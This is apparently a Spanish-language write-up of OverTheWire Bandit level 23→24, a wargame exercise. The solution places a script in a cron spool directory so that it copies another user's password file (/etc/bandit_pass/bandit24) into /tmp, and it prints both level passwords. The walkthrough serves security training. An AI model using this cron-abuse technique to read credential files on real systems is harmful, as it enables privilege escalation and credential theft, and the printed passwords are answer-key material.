# Bandit Level 23→ Level 24

# Objetivos
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# Datos de acceso al nivel
```bach
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```
# Solución
```bash
bandit23@bandit:~$ mkdir /tmp/kd
bandit23@bandit:~$ cd /tmp/kd
bandit23@bandit:/tmp/kd$ echo "cat /etc/bandit_pass/bandit24 >
/tmp/kd/password" > script.sh
bandit23@bandit:/tmp/kd$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/kd/password
bandit23@bandit:/tmp/kd$ chmod +x script.sh
bandit23@bandit:/tmp/kd$ touch password
bandit23@bandit:/tmp/kd$ chmod 666 password
bandit23@bandit:/tmp/kd$ ls –la

bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kd$ ls -la
total 10564
drwxrwxr-x    2 bandit23 bandit23     4096 Sep 18 16:25 .
drwxrwx-wt 3725 root     root     10801152 Sep 22 02:26 ..
-rw-rw-rw-    1 bandit23 bandit23        0 Sep 22 02:26 password
-rwxrwxr-x    1 bandit23 bandit23       49 Sep 22 02:26 script.sh
bandit23@bandit:/tmp/kd$ date
Fri Sep 22 02:26:25 AM UTC 2023
ls -la
total 10564
drwxrwxr-x    2 bandit23 bandit23     4096 Sep 18 16:25 .
drwxrwx-wt 3725 root     root     10801152 Sep 22 02:26 ..
-rw-rw-rw-    1 bandit23 bandit23        0 Sep 22 02:26 password
-rwxrwxr-x    1 bandit23 bandit23       49 Sep 22 02:26 script.sh
bandit23@bandit:/tmp/kd$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```


# Notas adicionales
|Comando|Descripcion|
|---|---|
|Cron | Es un administrador de tareas en sistemas operativos Unix , incluyendo Linux. Permite a los usuarios programar la ejecución de comandos o scripts en un momento específico o en intervalos regulares.



# Referencias
